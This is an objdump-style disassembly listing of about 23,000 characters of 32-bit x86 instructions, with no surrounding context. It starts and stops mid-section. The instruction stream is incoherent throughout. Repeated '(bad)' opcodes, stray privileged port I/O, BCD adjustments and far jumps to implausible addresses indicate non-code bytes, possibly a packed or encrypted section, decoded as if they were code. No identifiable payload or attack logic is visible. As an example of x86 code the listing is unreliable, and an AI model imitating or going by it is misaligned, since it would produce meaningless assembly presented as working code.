  424e8e:	lods   eax,DWORD PTR ds:[esi]
  424e8f:	imul   edx,ebp,0x9d64e5c7
  424e95:	xchg   edi,eax
  424e96:	mov    esi,0xfc421608
  424e9b:	sub    BYTE PTR [ecx],dl
  424e9d:	aad    0x20
  424e9f:	ret    0xe59d
  424ea2:	dec    ebp
  424ea3:	aaa    
  424ea4:	scas   al,BYTE PTR es:[edi]
  424ea5:	or     al,0xc
  424ea7:	jno    0x424e69
  424ea9:	in     al,0x4b
  424eab:	or     BYTE PTR [esi+edx*8+0x12],cl
  424eaf:	cmp    eax,0x4a3ae79f
  424eb4:	dec    ecx
  424eb5:	mov    edi,0x4a5b9478
  424eba:	push   ds
  424ebb:	bound  edi,QWORD PTR [eax+0x12443c12]
  424ec1:	jg     0x424eaf
  424ec3:	stos   DWORD PTR es:[edi],eax
  424ec4:	clc    
  424ec5:	jle    0x424e85
  424ec7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ec8:	aaa    
  424ec9:	das    
  424eca:	inc    ebx
  424ecb:	(bad)  
  424ecc:	out    dx,al
  424ecd:	stos   DWORD PTR es:[edi],eax
  424ece:	mov    esi,0xf9007db4
  424ed3:	div    BYTE PTR [ebx-0x6aa42de7]
  424ed9:	loopne 0x424ead
  424edb:	xor    al,ch
  424edd:	mov    ds:0xbdefee10,al
  424ee2:	sub    eax,DWORD PTR [edi]
  424ee4:	jne    0x424e91
  424ee6:	or     al,0xee
  424ee8:	cmp    DWORD PTR [edi+0xb],0xdf0d7e4a
  424eef:	bound  ebx,QWORD PTR [edi+0xfd9843e]
  424ef5:	loopne 0x424f0d
  424ef7:	sbb    eax,0x5b36915f
  424efc:	cdq    
  424efd:	or     bl,ah
  424eff:	push   eax
  424f00:	mov    eax,ds:0x28e7c900
  424f05:	sub    ebx,DWORD PTR [ecx-0x414a5dca]
  424f0b:	aas    
  424f0c:	mov    ds:0x9221ff6,eax
  424f11:	aaa    
  424f12:	adc    ebx,DWORD PTR [esi-0x35ce784f]
  424f18:	push   ecx
  424f19:	das    
  424f1a:	dec    ebp
  424f1b:	cmp    eax,ebp
  424f1d:	test   BYTE PTR [eax],ah
  424f1f:	xor    al,0x1f
  424f21:	mov    edi,0xfa6e0d7d
  424f26:	std    
  424f27:	add    ecx,edi
  424f29:	daa    
  424f2a:	nop
  424f2b:	scas   eax,DWORD PTR es:[edi]
  424f2c:	inc    ebx
  424f2d:	outs   dx,BYTE PTR ds:[esi]
  424f2e:	into   
  424f2f:	xlat   BYTE PTR ds:[ebx]
  424f30:	push   cs
  424f31:	pop    ecx
  424f32:	fisub  DWORD PTR [bp+si+0x1053]
  424f37:	cmp    cl,BYTE PTR [eax-0x4be01764]
  424f3d:	mov    ecx,DWORD PTR [edi+esi*4+0x4e]
  424f41:	das    
  424f42:	dec    eax
  424f43:	mov    edx,0x24255ac4
  424f48:	jl     0x424f95
  424f4a:	push   0xffffffa5
  424f4c:	push   edi
  424f4d:	push   ebx
  424f4e:	mov    esi,0x730a0cba
  424f53:	adc    al,0x15
  424f55:	xor    bp,WORD PTR [edi+eax*2+0x70bac6ec]
  424f5d:	sbb    ah,BYTE PTR [esi]
  424f5f:	add    eax,0x25af0c10
  424f64:	out    dx,eax
  424f65:	pop    ecx
  424f66:	xor    eax,0xb696790d
  424f6b:	mov    dl,0xeb
  424f6d:	xchg   BYTE PTR [ecx+0x30be8f9b],ch
  424f73:	jb     0x424efb
  424f75:	jmp    0x424f46
  424f77:	add    al,0xbe
  424f79:	fbstp  TBYTE PTR [edx+0x4805b8c1]
  424f7f:	loop   0x424f4b
  424f81:	add    eax,0xea29303b
  424f86:	add    dl,BYTE PTR [ebp+0x7695bd69]
  424f8c:	inc    ecx
  424f8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f8e:	jecxz  0x424f8c
  424f90:	rcr    BYTE PTR [eax+ebx*2+0x60],1
  424f94:	gs inc ebx
  424f96:	out    0xea,al
  424f98:	in     al,dx
  424f99:	pusha  
  424f9a:	mov    dl,0x5
  424f9c:	jmp    0x3b1b814a
  424fa1:	sub    esi,DWORD PTR [ecx]
  424fa3:	cdq    
  424fa4:	mov    dh,0x93
  424fa6:	push   es
  424fa7:	xchg   BYTE PTR [ebx],bl
  424fa9:	dec    ecx
  424faa:	sti    
  424fab:	je     0x424fb7
  424fad:	outs   dx,BYTE PTR ds:[esi]
  424fae:	popa   
  424faf:	xchg   DWORD PTR [esi+0x1d6806d5],esp
  424fb5:	stc    
  424fb6:	test   eax,0xbaf50420
  424fbb:	inc    eax
  424fbc:	ret    0x3e5f
  424fbf:	sbb    ebx,DWORD PTR [ebx]
  424fc1:	idiv   ecx
  424fc3:	les    ebp,FWORD PTR [ecx+0x1b]
  424fc6:	inc    edi
  424fc7:	xchg   edx,eax
  424fc8:	fucomi st,st(0)
  424fca:	mov    ah,0x10
  424fcc:	or     dl,BYTE PTR [ebx]
  424fce:	adc    eax,0xc3a30c49
  424fd3:	loop   0x424f88
  424fd5:	mov    dh,0xe
  424fd7:	dec    esi
  424fd8:	push   esi
  424fd9:	arpl   WORD PTR [eax-0xd],dx
  424fdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424fdd:	xchg   edi,eax
  424fde:	arpl   WORD PTR [edi],si
  424fe0:	call   0xbf7e921f
  424fe5:	adc    eax,0x95c7cee6
  424fea:	cdq    
  424feb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424fec:	mov    cl,BYTE PTR [edx-0x54775529]
  424ff2:	inc    esi
  424ff3:	sub    al,BYTE PTR [edx]
  424ff5:	and    ah,BYTE PTR [ebp-0x7c2502f4]
  424ffb:	mov    dh,0x5c
  424ffd:	daa    
  424ffe:	popf   
  424fff:	cwde   
  425000:	shr    DWORD PTR [ebp+ecx*4-0x2e1ba47b],0x53
  425008:	pop    es
  425009:	add    al,bh
  42500b:	lods   eax,DWORD PTR ds:[esi]
  42500c:	cmp    ebp,DWORD PTR [esi+0xf]
  42500f:	or     DWORD PTR [ebx],ecx
  425011:	adc    BYTE PTR [edi+0x349baaeb],dh
  425017:	sbb    bh,ah
  425019:	retf   0x58e3
  42501c:	(bad)  
  42501d:	aaa    
  42501e:	jno    0x425058
  425020:	mov    BYTE PTR [ebp+0x6c4d1064],dh
  425026:	cld    
  425027:	aaa    
  425028:	xor    eax,0x7fa62c2f
  42502d:	mov    esi,0xe0706331
  425032:	cmp    al,0x9c
  425034:	mov    BYTE PTR [ecx],dh
  425036:	test   al,0x8a
  425038:	cs imul eax,ebx,0xf4843812
  42503f:	push   esi
  425040:	daa    
  425041:	adc    BYTE PTR [esi+0x9],ch
  425044:	xor    dh,ah
  425046:	xchg   ebx,eax
  425047:	mov    DWORD PTR [edi],0xf72de738
  42504d:	lea    esi,[esi-0x80]
  425050:	sub    ah,dl
  425052:	out    0x75,al
  425054:	pop    eax
  425055:	dec    ecx
  425056:	mov    ebx,0x364c3780
  42505b:	and    al,BYTE PTR [esi]
  42505d:	mov    ds:0x1a01097a,al
  425062:	aam    0x1e
  425064:	mov    al,0xdb
  425066:	push   ss
  425067:	cmp    cl,bh
  425069:	sub    DWORD PTR [ebp+eax*1-0x1886c68a],esp
  425070:	inc    edi
  425071:	mov    bl,0x17
  425073:	addr16 loop 0x42505d
  425076:	xchg   edi,eax
  425077:	sbb    ch,ch
  425079:	rcr    BYTE PTR [esi+0x78],1
  42507c:	enter  0x53f7,0x69
  425080:	aam    0x24
  425082:	jl     0x425014
  425084:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425085:	(bad)  
  425086:	add    BYTE PTR [esi],ah
  425088:	inc    esi
  425089:	mov    esi,0x9aaeba43
  42508e:	clc    
  42508f:	and    eax,0xdde839a5
  425094:	and    edx,esi
  425096:	sub    BYTE PTR [edi],ch
  425098:	int    0x33
  42509a:	addr16 cmc 
  42509c:	(bad)  
  42509d:	fistp  WORD PTR [edx-0x78]
  4250a0:	push   es
  4250a1:	(bad)  
  4250a2:	cdq    
  4250a3:	sbb    ch,BYTE PTR ds:0xf38c9872
  4250a9:	push   0xffffff8c
  4250ab:	imul   esp,DWORD PTR [edx+0x2a67d1a5],0x7d
  4250b2:	dec    esi
  4250b3:	retf   
  4250b4:	in     al,dx
  4250b5:	(bad)  
  4250b6:	pop    edi
  4250b7:	push   ds
  4250b8:	rol    DWORD PTR [edx+esi*4+0x42],1
  4250bc:	repnz push ds
  4250be:	adc    eax,0x57551f32
  4250c3:	or     esi,esi
  4250c5:	gs pop ebx
  4250c7:	adc    eax,DWORD PTR [eax-0x5a]
  4250ca:	stc    
  4250cb:	aas    
  4250cc:	mov    edx,0xbee64458
  4250d1:	dec    edi
  4250d2:	jle    0x425114
  4250d4:	mov    bh,0xbb
  4250d6:	jnp    0x425076
  4250d8:	fwait
  4250d9:	ins    DWORD PTR es:[edi],dx
  4250da:	and    DWORD PTR [edi-0x47],0xc5bc4076
  4250e1:	imul   edx,DWORD PTR [esi+0x1c],0xfaf4311d
  4250e8:	mov    ebp,DWORD PTR [edi-0x1e]
  4250eb:	imul   esp,DWORD PTR [ecx+ecx*2-0x4d75bfb5],0x1fbd7fa5
  4250f6:	outs   dx,BYTE PTR ds:[esi]
  4250f7:	rcl    esi,0xd8
  4250fa:	cmp    BYTE PTR [esi],bl
  4250fc:	rol    BYTE PTR [ebp+0xc995eb],1
  425102:	inc    edi
  425103:	sub    eax,0xb72ddd59
  425108:	std    
  425109:	mov    WORD PTR [edi+0x52],ds
  42510c:	jge    0x425092
  42510e:	cld    
  42510f:	std    
  425110:	imul   ebx,DWORD PTR [ebx],0x680094ae
  425116:	das    
  425117:	push   ebp
  425118:	lds    esi,FWORD PTR [esi-0x46aff5fc]
  42511e:	adc    edi,DWORD PTR [eax-0x5baf05dd]
  425124:	in     al,dx
  425125:	das    
  425126:	stos   BYTE PTR es:[edi],al
  425127:	pop    ecx
  425128:	jge    0x425170
  42512a:	or     al,0x6c
  42512c:	xchg   esi,eax
  42512d:	stos   DWORD PTR es:[edi],eax
  42512e:	mov    DWORD PTR [edi-0x367f94c3],edi
  425134:	mov    esp,DWORD PTR [ebp-0x2e]
  425137:	cmc    
  425138:	shl    BYTE PTR [eax],1
  42513a:	mov    ds:0xd4885a6e,al
  42513f:	(bad)  
  425142:	inc    esp
  425143:	addr16 mov ecx,esp
  425146:	push   ebx
  425147:	sbb    ah,BYTE PTR [ecx-0x16]
  42514a:	addr16 mov eax,0x7dfc75a8
  425151:	xchg   esi,eax
  425152:	mov    al,0x9
  425154:	mov    WORD PTR [edx+edi*8+0x32369312],?
  42515b:	je     0x4251c2
  42515d:	inc    eax
  42515e:	xchg   edi,eax
  42515f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425160:	add    dh,BYTE PTR [ebp+ebp*2+0x2ab6dcc5]
  425167:	adc    eax,0xe6dc6088
  42516c:	xor    DWORD PTR [edx],edi
  42516e:	mov    edi,0x78ee45d3
  425173:	test   cl,ch
  425175:	cdq    
  425176:	sbb    BYTE PTR [esi-0x26],dh
  425179:	push   ss
  42517a:	daa    
  42517b:	cs pop ds
  42517d:	and    BYTE PTR [edx+0x25],0xb5
  425181:	sub    BYTE PTR [ebx-0x1a444f40],0x75
  425188:	aas    
  425189:	or     DWORD PTR [ecx-0x22],esp
  42518c:	shl    esp,1
  42518e:	sub    bl,ch
  425190:	mov    dh,0x1f
  425192:	add    ebp,DWORD PTR [edx]
  425194:	mov    ebx,0x15101e35
  425199:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42519a:	in     eax,0x81
  42519c:	cli    
  42519d:	inc    esi
  42519e:	lods   al,BYTE PTR ds:[esi]
  42519f:	jno    0x425142
  4251a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4251a2:	xchg   ebx,eax
  4251a3:	sahf   
  4251a4:	xchg   edi,eax
  4251a5:	(bad)  
  4251a6:	pop    ds
  4251a7:	mov    eax,0x3bb3572d
  4251ac:	sub    eax,0x7cfca8a4
  4251b1:	jge    0x425134
  4251b3:	ret    0x1cb4
  4251b6:	mov    al,0xe0
  4251b8:	lds    edx,FWORD PTR [edi+eax*4-0x23d40b4f]
  4251bf:	dec    eax
  4251c0:	shl    DWORD PTR [esi+0x2a],cl
  4251c3:	push   es
  4251c4:	jbe    0x42515a
  4251c6:	fld    DWORD PTR [eax+0x4a]
  4251c9:	ret    0x54db
  4251cc:	jbe    0x4251ee
  4251ce:	jo     0x425220
  4251d0:	inc    edx
  4251d1:	(bad)  
  4251d2:	pushf  
  4251d3:	lock cdq 
  4251d5:	inc    edi
  4251d7:	test   BYTE PTR [esi-0x53f252b],0x79
  4251de:	mov    ecx,0x66a61c39
  4251e3:	fisttp DWORD PTR [ebp+edx*2+0x1e23d386]
  4251ea:	sahf   
  4251eb:	push   0xd624f6f0
  4251f0:	outs   dx,BYTE PTR ds:[esi]
  4251f1:	push   0x91f36415
  4251f6:	sti    
  4251f7:	dec    edi
  4251f8:	jge    0x425203
  4251fa:	mov    esi,0xf54db18e
  4251ff:	test   eax,0x6e661b93
  425204:	inc    ebp
  425205:	cmp    esp,DWORD PTR [ebx+0x393106f3]
  42520b:	cmp    al,0x0
  42520d:	ins    BYTE PTR es:[edi],dx
  42520e:	sub    al,0x7f
  425210:	xlat   BYTE PTR ds:[ebx]
  425211:	mov    edx,0xdb526e68
  425216:	xchg   ebp,edx
  425218:	jge    0x4251b4
  42521a:	add    BYTE PTR [edx+0x28],0x9
  42521e:	ja     0x425248
  425220:	pop    ds
  425221:	aas    
  425222:	add    esp,DWORD PTR [ebx+0x212f2b3f]
  425228:	iret   
  425229:	(bad)  
  42522a:	and    BYTE PTR [ecx-0x7187610],ah
  425230:	das    
  425231:	lds    eax,FWORD PTR [ebx+0x39]
  425234:	icebp  
  425235:	pop    esp
  425236:	xchg   bl,ch
  425238:	push   cs
  425239:	js     0x4251c8
  42523b:	fwait
  42523c:	add    eax,0xc4ea462d
  425241:	in     eax,dx
  425242:	ret    
  425243:	mov    ds:0x62c73be,al
  425248:	in     al,dx
  425249:	push   ebp
  42524a:	xlat   BYTE PTR ds:[ebx]
  42524b:	sub    eax,0x54d8e393
  425250:	and    dh,al
  425252:	adc    eax,0x86b0ddbd
  425257:	and    dl,bh
  425259:	mov    bh,0x94
  42525b:	xor    ecx,DWORD PTR [ebp-0x21]
  42525e:	sti    
  42525f:	sti    
  425260:	push   cs
  425261:	pop    ebx
  425262:	iret   
  425263:	jnp    0x42520a
  425265:	mov    eax,ds:0x9a9314c1
  42526a:	mov    ebx,DWORD PTR [eax+0xe]
  42526d:	cmp    eax,0xdd67df96
  425272:	mov    ebp,0x6e249f9b
  425277:	sub    BYTE PTR [ebx-0x8666abf],dh
  42527d:	retf   0x9549
  425280:	std    
  425281:	in     al,0xff
  425283:	xchg   esi,eax
  425284:	icebp  
  425285:	(bad)  
  425286:	hlt    
  425287:	jne    0x4252bb
  425289:	scas   al,BYTE PTR es:[edi]
  42528a:	inc    eax
  42528b:	cli    
  42528c:	xor    dh,ah
  42528e:	stos   BYTE PTR es:[edi],al
  42528f:	int    0x9d
  425291:	dec    ebp
  425292:	(bad)  
  425293:	test   DWORD PTR [ebx],0x949ac1e0
  425299:	inc    ecx
  42529a:	jge    0x425313
  42529c:	jmp    0x425296
  42529e:	sub    cl,dl
  4252a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4252a1:	mov    al,0x37
  4252a3:	stc    
  4252a4:	fist   DWORD PTR [edi-0x5]
  4252a7:	sbb    cl,BYTE PTR [edx+0x481f346b]
  4252ad:	mov    ds:0xeae4effd,eax
  4252b2:	xchg   edi,eax
  4252b3:	pushf  
  4252b4:	in     eax,0x42
  4252b6:	test   al,0x9c
  4252b8:	in     eax,dx
  4252b9:	xchg   esi,eax
  4252ba:	add    eax,0xfaf95def
  4252bf:	mov    eax,ds:0x8afdaf82
  4252c4:	in     eax,dx
  4252c5:	add    ebp,esp
  4252c7:	jge    0x42533f
  4252c9:	inc    ecx
  4252ca:	test   al,0xf9
  4252cc:	or     eax,0x52ec76bb
  4252d1:	repz adc esi,DWORD PTR [eax-0x16]
  4252d5:	jne    0x425351
  4252d7:	xor    al,0xb8
  4252d9:	out    0x66,eax
  4252db:	movaps xmm3,XMMWORD PTR [esi]
  4252de:	retf   0x490d
  4252e1:	scas   eax,DWORD PTR es:[edi]
  4252e2:	aam    0x5
  4252e4:	mov    WORD PTR [ebp+0x48],?
  4252e7:	je     0x425273
  4252e9:	punpckhdq mm2,QWORD PTR [eax+edi*1]
  4252ed:	ret    0x593c
  4252f0:	sub    eax,0xd8cff059
  4252f5:	mov    al,ds:0xe7f5605a
  4252fa:	stc    
  4252fb:	dec    ebp
  4252fc:	push   0x2d0ba584
  425301:	hlt    
  425302:	or     BYTE PTR [esi],al
  425304:	and    DWORD PTR [ebp+0x21d198d3],eax
  42530a:	pushf  
  42530b:	mov    dl,0x4
  42530d:	fwait
  42530e:	neg    bh
  425310:	jbe    0x425346
  425312:	push   cs
  425313:	hlt    
  425314:	pop    esp
  425315:	clc    
  425316:	shl    DWORD PTR ds:0x91ab76f,0xfc
  42531d:	dec    eax
  42531e:	pusha  
  42531f:	ret    
  425320:	xor    eax,0x5
  425323:	sbb    eax,0x56469e36
  425328:	or     edx,DWORD PTR [eax]
  42532a:	push   eax
  42532b:	(bad)  
  42532c:	pop    ecx
  42532e:	push   ss
  42532f:	dec    esi
  425330:	mov    BYTE PTR [ecx-0x3386e7b1],dh
  425336:	fild   QWORD PTR [esi-0x71]
  425339:	cmp    edx,DWORD PTR [ebp+0x29]
  42533c:	icebp  
  42533d:	lahf   
  42533e:	and    esi,DWORD PTR [ebp+edx*8+0x4178d446]
  425345:	cmp    ecx,DWORD PTR [eax+0x40]
  425348:	pop    esp
  425349:	inc    esp
  42534a:	inc    esi
  42534b:	mul    ch
  42534d:	add    BYTE PTR [eax],al
  42534f:	add    BYTE PTR [eax],al
  425351:	add    BYTE PTR [ebx-0x11909fab],bl
  425357:	jg     0x4252f8
  425359:	cmc    
  42535a:	or     DWORD PTR fs:[edi+0x22],ebx
  42535e:	loopne 0x425321
  425360:	mov    WORD PTR ds:0x1cbef,?
  425366:	repz add al,0x0
  425369:	add    BYTE PTR [eax+0x4b],al
  42536c:	mov    edi,0x12c3580
  425371:	add    ebp,edi
  425373:	js     0x42533e
  425375:	sbb    eax,0x21aa2fdf
  42537a:	imul   edx,DWORD PTR [ecx+0x6e],0x56133e8e
  425381:	pop    esp
  425382:	(bad)  
  425383:	(bad)  ds:0xd9d022bb
  425389:	in     eax,dx
  42538a:	ins    DWORD PTR es:[edi],dx
  42538b:	mov    dh,0xd4
  42538d:	fsub   DWORD PTR [eax-0x1]
  425390:	(bad)  
  425391:	fs je  0x425373
  425394:	shl    BYTE PTR [ecx],0xf7
  425397:	mov    DWORD PTR [eax],ecx
  425399:	enter  0xa2e8,0x76
  42539d:	or     BYTE PTR [edi+0x46],al
  4253a0:	fdiv   DWORD PTR [ecx]
  4253a2:	xchg   dl,bh
  4253a4:	cs sti 
  4253a6:	push   0xffffffbb
  4253a8:	rcl    BYTE PTR [edi-0x58],1
  4253ab:	scas   eax,DWORD PTR es:[edi]
  4253ac:	add    BYTE PTR ds:0x7d8511ec,ah
  4253b2:	popf   
  4253b3:	xor    BYTE PTR [edx],0x16
  4253b6:	jmp    0x4253be
  4253b8:	rcl    DWORD PTR ds:0xc40e2600,cl
  4253be:	sbb    DWORD PTR [edx],edx
  4253c0:	test   eax,0x343974e7
  4253c5:	sti    
  4253c6:	xor    DWORD PTR [eax],0x49fd6b43
  4253cc:	xor    ch,dl
  4253ce:	jl     0x425394
  4253d0:	cmp    edx,DWORD PTR [edx]
  4253d2:	(bad)  
  4253d3:	scas   al,BYTE PTR es:[edi]
  4253d4:	cmp    BYTE PTR [esi-0x60d70b3b],cl
  4253da:	jmp    0x425434
  4253dc:	js     0x4253f1
  4253de:	cmp    BYTE PTR [ebx],dl
  4253e0:	mov    dh,0xb
  4253e2:	sub    eax,0xb5e05ce4
  4253e7:	cmovle eax,DWORD PTR [edx+0x4f165508]
  4253ee:	cdq    
  4253ef:	pop    ebx
  4253f0:	jl     0x4253a7
  4253f2:	test   al,0x2e
  4253f4:	ror    ecx,1
  4253f6:	xor    edi,DWORD PTR [eax-0x33]
  4253f9:	add    eax,0x98ee8f0
  4253fe:	je     0x4253e3
  425400:	aam    0x0
  425402:	daa    
  425403:	push   ss
  425404:	loopne 0x42547a
  425406:	shr    dl,0xa7
  425409:	sbb    eax,0x22b02997
  42540e:	or     DWORD PTR ds:0x3fd42e6f,0xffffffa4
  425415:	add    BYTE PTR [edi+0x33e0dd1d],bh
  42541b:	push   ds
  42541c:	jecxz  0x42545a
  42541e:	pop    ecx
  42541f:	fcom   QWORD PTR [esi-0x46dc7613]
  425425:	sub    eax,0xc4d85f16
  42542a:	pop    edi
  42542b:	inc    eax
  42542c:	sbb    ch,bh
  42542e:	and    DWORD PTR [edx+0x35],edi
  425431:	pop    esp
  425432:	retf   
  425433:	push   ss
  425434:	mov    DWORD PTR [eax-0x1830d6ea],ebx
  42543a:	je     0x4253e7
  42543c:	ret    
  42543d:	call   0xf65c5e22
  425442:	lods   al,BYTE PTR ds:[esi]
  425443:	cli    
  425444:	adc    BYTE PTR [edi+0x18],bh
  425447:	xchg   edi,eax
  425448:	or     eax,0x53714d65
  42544d:	mov    ?,eax
  42544f:	cli    
  425450:	xchg   edi,eax
  425451:	scas   al,BYTE PTR es:[edi]
  425452:	arpl   WORD PTR [edi+0x61307b3d],bx
  425458:	push   ebx
  425459:	test   DWORD PTR [esi-0x1b],0x46482f0d
  425460:	loope  0x425425
  425462:	push   ss
  425463:	inc    esi
  425464:	sbb    al,0xac
  425466:	sub    eax,0xc0433dae
  42546b:	scas   eax,DWORD PTR es:[edi]
  42546c:	sbb    bh,BYTE PTR ds:0x570b44cd
  425472:	dec    ebx
  425473:	pop    edi
  425474:	mov    cl,0x71
  425476:	call   0xb051:0xe9932113
  42547d:	int3   
  42547e:	jmp    0x4254d8
  425480:	enter  0xafb2,0x46
  425484:	je     0x4254b4
  425486:	ja     0x4254f7
  425488:	pop    edi
  425489:	imul   DWORD PTR [edx-0x66]
  42548c:	hlt    
  42548d:	dec    edi
  42548e:	mov    ebx,0xbaaf822a
  425493:	sub    DWORD PTR [ebp-0x25],ecx
  425496:	xor    eax,0xc9260f02
  42549b:	mov    cl,0x11
  42549d:	lock add ebp,ebp
  4254a0:	test   edi,0x8eadcb0b
  4254a6:	stos   DWORD PTR es:[edi],eax
  4254a7:	fstp   QWORD PTR [eax-0x26263353]
  4254ad:	cmp    BYTE PTR fs:[ebx+0x7f4e20a5],dh
  4254b4:	mov    esp,0xbc9993ea
  4254b9:	sbb    BYTE PTR [edi-0x1906d29c],ch
  4254bf:	xchg   esi,eax
  4254c0:	std    
  4254c1:	sbb    DWORD PTR [ecx+eiz*4],edx
  4254c4:	mov    edx,0x932a0e38
  4254c9:	fbld   TBYTE PTR [edx]
  4254cb:	vmread ebx,ebx
  4254ce:	lods   al,BYTE PTR ds:[esi]
  4254cf:	push   edx
  4254d0:	loop   0x425510
  4254d2:	push   eax
  4254d3:	adc    bh,BYTE PTR [edx+0x54]
  4254d6:	push   ss
  4254d7:	adc    DWORD PTR [edx],ebp
  4254d9:	stos   BYTE PTR es:[edi],al
  4254da:	mov    edi,0x1029f775
  4254df:	hlt    
  4254e0:	jmp    0xbf0:0x5d583aa2
  4254e7:	aad    0xa5
  4254e9:	pop    ecx
  4254ea:	push   ecx
  4254eb:	xor    ebx,ecx
  4254ed:	icebp  
  4254ee:	test   eax,0x82578452
  4254f3:	loopne 0x42548c
  4254f5:	stos   WORD PTR es:[edi],ax
  4254f7:	(bad)
  4254fb:	lea    ecx,[esi+0x3b]
  4254fe:	int3   
  4254ff:	mov    cl,0xc3
  425501:	inc    eax
  425502:	pop    ds
  425503:	outs   dx,BYTE PTR ds:[esi]
  425504:	sar    DWORD PTR [ecx+0x5d43288e],0x0
  42550b:	mov    cl,0x5c
  42550d:	dec    ebp
  42550e:	cmp    DWORD PTR [eax-0x69454963],0xc3c2fefc
  425518:	add    esi,ecx
  42551a:	and    BYTE PTR ds:0x39efa6ee,al
  425520:	pop    eax
  425521:	mov    al,0x5c
  425523:	and    BYTE PTR [edi+0x5a07567f],ah
  425529:	pop    esi
  42552a:	mov    al,dl
  42552c:	fnstcw WORD PTR [ebx]
  42552e:	sub    al,0x7e
  425530:	mov    al,0x9c
  425532:	dec    edx
  425533:	and    al,BYTE PTR [ebx+esi*4+0x2db830d0]
  42553a:	repz pop ebp
  42553c:	adc    eax,DWORD PTR [esi+0x57e7049f]
  425542:	dec    edi
  425543:	cld    
  425544:	je     0x425540
  425546:	add    ebx,DWORD PTR [edi]
  425548:	xor    al,0x60
  42554a:	adc    eax,0xddd7e7ac
  42554f:	mov    dl,0x11
  425551:	jecxz  0x4254dd
  425553:	arpl   cx,dx
  425555:	std    
  425556:	pop    ss
  425557:	out    dx,al
  425558:	mov    bh,0x5c
  42555a:	rol    DWORD PTR [eax],cl
  42555c:	inc    ebp
  42555d:	loop   0x425532
  42555f:	xor    DWORD PTR [ebx],ecx
  425561:	ret    
  425562:	and    edx,DWORD PTR [eax-0x8]
  425565:	pop    edi
  425566:	xchg   esp,eax
  425567:	aam    0x70
  425569:	xchg   edi,eax
  42556a:	mov    WORD PTR [ecx-0x49048505],fs
  425570:	jbe    0x425547
  425572:	push   edx
  425573:	xor    eax,0x4c123f67
  425578:	mov    esp,0x45df64d4
  42557d:	ret    0x4478
  425580:	cmp    al,0x2f
  425582:	add    BYTE PTR [ebx+0x64],dh
  425585:	or     eax,0xaf3ac1f6
  42558a:	shl    bl,0xba
  42558d:	jno    0x425529
  42558f:	aam    0x94
  425591:	jl     0x42560a
  425593:	pop    eax
  425594:	and    edx,DWORD PTR [ecx]
  425596:	aad    0xc7
  425598:	mov    dl,0x18
  42559a:	ret    
  42559b:	mov    al,0xc9
  42559d:	mov    eax,ds:0x4b6057b0
  4255a2:	mov    esp,0xf904602a
  4255a7:	jbe    0x425568
  4255a9:	inc    edi
  4255aa:	(bad)  
  4255ab:	(bad)  
  4255ad:	je     0x42557c
  4255af:	xchg   esp,eax
  4255b0:	lods   eax,DWORD PTR ds:[esi]
  4255b1:	jnp    0x42556f
  4255b3:	jcxz   0x4255f5
  4255b6:	je     0x4255ce
  4255b8:	test   al,0xae
  4255ba:	xor    DWORD PTR [ebx-0x59],edi
  4255bd:	out    dx,eax
  4255be:	mov    ecx,0x975bbd68
  4255c3:	idiv   DWORD PTR [esi+0x7d]
  4255c6:	in     al,dx
  4255c7:	addr16 clc 
  4255c9:	lods   eax,DWORD PTR ds:[esi]
  4255ca:	ror    DWORD PTR [edi],1
  4255cc:	jp     0x425569
  4255ce:	loope  0x425625
  4255d0:	xchg   BYTE PTR [esp+edx*8+0xbd26c82],al
  4255d7:	call   0x3b708fe7
  4255dc:	xlat   BYTE PTR ds:[ebx]
  4255dd:	sub    BYTE PTR [edx+0x45dc1784],dh
  4255e3:	in     eax,0x23
  4255e5:	es bnd jp 0x425597
  4255e9:	push   ebx
  4255ea:	pushf  
  4255eb:	lahf   
  4255ec:	jmp    0x7c00:0x8f9359e3
  4255f3:	mov    al,ds:0x83073623
  4255f8:	mov    ebp,0xf7469e4f
  4255fd:	and    dh,al
  4255ff:	sub    ebp,ebp
  425601:	cli    
  425602:	ja     0x42561f
  425604:	lock mov dh,0xf9
  425607:	in     eax,0x88
  425609:	or     cl,BYTE PTR [esp+edi*1+0x3a15a491]
  425610:	popa   
  425611:	ret    0x99a6
  425614:	pop    es
  425615:	jp     0x425632
  425617:	ss add eax,0xbccf7311
  42561d:	xchg   edx,eax
  42561e:	retf   
  42561f:	dec    ecx
  425620:	dec    ecx
  425621:	mov    ebx,0x2fe2231e
  425626:	repz inc esi
  425628:	lock xor al,0xb9
  42562b:	dec    esi
  42562c:	xlat   BYTE PTR ds:[ebx]
  42562d:	mov    ds:0x5b74f721,eax
  425632:	pop    edx
  425633:	in     al,dx
  425634:	adc    al,0xd5
  425636:	fmul   QWORD PTR [eax-0x65]
  425639:	jle    0x42561d
  42563b:	sub    dl,bl
  42563d:	adc    esp,DWORD PTR [edx-0x53e79e39]
  425643:	jge    0x42568b
  425645:	ret    0x7cda
  425648:	dec    ecx
  425649:	fs cli 
  42564b:	test   al,0xc6
  42564d:	imul   esp,DWORD PTR [ebx+0x17],0x6f9d67b1
  425654:	stc    
  425655:	adc    dh,ah
  425657:	addr16 cwde 
  425659:	dec    ecx
  42565a:	jae    0x4256ba
  42565c:	mov    dh,cl
  42565e:	mov    ebx,0x505fe600
  425663:	xchg   esp,eax
  425664:	push   ebp
  425665:	pushf  
  425666:	pop    ecx
  425667:	cmp    DWORD PTR [edi],edi
  425669:	test   al,0x78
  42566b:	mov    WORD PTR [ebp-0x405e4e35],?
  425671:	adc    eax,0x157075a9
  425676:	pop    ebx
  425677:	fmul   st(0),st
  425679:	xchg   ecx,eax
  42567a:	(bad)  
  42567b:	das    
  42567c:	in     al,0xd1
  42567e:	add    esi,DWORD PTR [eax-0x412f2090]
  425684:	pop    ecx
  425685:	test   DWORD PTR [eax+edx*8-0x4d],0x77442520
  42568d:	sbb    esi,ecx
  42568f:	jle    0x4256dc
  425691:	sub    bh,BYTE PTR [eax]
  425693:	jmp    0x425648
  425695:	add    DWORD PTR [edi-0x1502a769],0x7d
  42569c:	pop    es
  42569d:	xor    bl,bh
  42569f:	and    BYTE PTR [eax],ah
  4256a1:	push   esi
  4256a2:	sbb    BYTE PTR [edi-0x4ada3ad4],cl
